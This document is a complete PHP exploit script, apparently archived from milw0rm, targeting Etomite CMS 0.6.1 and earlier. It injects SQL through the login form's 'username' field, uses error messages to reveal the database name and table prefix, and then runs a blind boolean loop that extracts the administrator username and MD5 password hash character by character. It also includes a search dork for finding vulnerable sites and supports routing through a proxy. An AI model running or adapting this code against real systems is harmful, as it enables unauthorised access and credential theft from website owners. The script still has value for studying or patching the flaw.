#!/usr/bin/php -q -d short_open_tag=on
<?
echo "Etomite CMS <= 0.6.1 (all patches applied) 'username' SQL injection / admin credentials disclosure\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "google dork: \"Content managed by the Etomite Content Management System\"\r\n\r\n";

/*
works with magic_quotes_gpc=Off
*/

if ($argc<3) {
echo "Usage: php ".$argv[0]." host path OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to etomite\r\n";
echo "Options:\r\n";
echo "   -T[prefix]:  specify a table prefix (default: etomite_)\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /etomite/ \r\n";
echo "php ".$argv[0]." localhost / -P1.1.1.1:80\r\n";
die;
}
/*
software site: http://www.etomite.org/

explaination:

goto http://[target]/[path_to_etomite]/manager/index.php

and, if magic_quotes_gpc=Off you have sql injection in 'username' argument

you *could* bypass login check with a well crafted 'UNION SELECT' but the
following 'REPLACE INTO' query will fail.
Through the error message you can disclose database name and table prefix
that will be useful to go on with a new attack, asking true/false questions
to the database to dislose username/md5 hash pair...

*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $refix=str_replace("-T","",$argv[$i]);
}
}

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$prefix="etomite_"; //default
$dbname="etomite"; //default

// ** disclose dbname & table prefix **
$sql="99999999$'/**/UNION/**/SELECT/**/0,'sutnzu',MD5('suntzu'),0,0,0,0,0,0,0,0,0,0,0,0,0,0/*";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$data="rememberme=1";
$data.="&location=";
$data.="&username=".$sql;
$data.="&password=suntzu";
$data.="&thing=";
$data.="&submit=Login";
$data.="&licenseOK=1";
$packet ="POST ".$p."manager/processors/login.processor.php HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<=count($temp)-1; $i++)
{
$temp2=explode(" ",$temp[$i]);
$cookie.=" ".$temp2[0];
}
$packet ="GET ".$p."manager/index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"REPLACE INTO"))
{
$temp=explode("REPLACE INTO `",$html);
$temp2=explode("active_users",$temp[1]);
$temp=explode("`.",$temp2[0]);
$dbname=$temp[0];
$prefix=$temp[1];
}
else
{
echo "using default values for dbame & prefix...\r\n";
}
echo "database name -> ".$dbname."\r\n";
echo "table prefix  -> ".$prefix."\r\n";
sleep(2);
//** end **

//** launch exploit **
$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
//print_r(array_values($md5s));
$password="";
$j=1;
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$md5s))
{
$sql="99999999$'/**/UNION/**/SELECT/**/0,'suntzu',(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),MD5('suntzu'),-1)),0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/FROM/**/`".$dbname."`.".$prefix."manager_users,`".$dbname."`.".$prefix."user_attributes/*";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$data="rememberme=1";
$data.="&location=";
$data.="&username=".$sql;
$data.="&password=suntzu";
$data.="&thing=";
$data.="&submit=Login";
$data.="&licenseOK=1";
$packet ="POST ".$p."manager/processors/login.processor.php HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (!strstr($html,"Incorrect username or password entered")) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}

$admin="";
$j=1;
while (!strstr($admin,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
$sql="99999999$'/**/UNION/**/SELECT/**/0,'suntzoi',(IF((ASCII(SUBSTRING(username,".$j.",1))=".$i."),MD5('suntzoi'),-1)),0,0,0,0,0,0,0,0,0,0,0,0,0,0/**/FROM/**/`".$dbname."`.".$prefix."manager_users,`".$dbname."`.".$prefix."user_attributes/*";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$data="rememberme=1";
$data.="&location=";
$data.="&username=".$sql;
$data.="&password=suntzoi";
$data.="&thing=";
$data.="&submit=Login";
$data.="&licenseOK=1";
$packet ="POST ".$p."manager/processors/login.processor.php HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (!strstr($html,"Incorrect username or password entered")) {$admin.=chr($i);echo "admin -> ".$admin."[???]\r\n";sleep(2);break;}
if ($i==255) {die("Exploit failed...");}
}
$j++;
}
echo "-----------------------------------------------------------------------\r\n";
echo "admin          -> ".$admin."\r\n";
echo "password (md5) -> ".$password."\r\n";
echo "-----------------------------------------------------------------------\r\n";
?>

# milw0rm.com [2006-07-25]
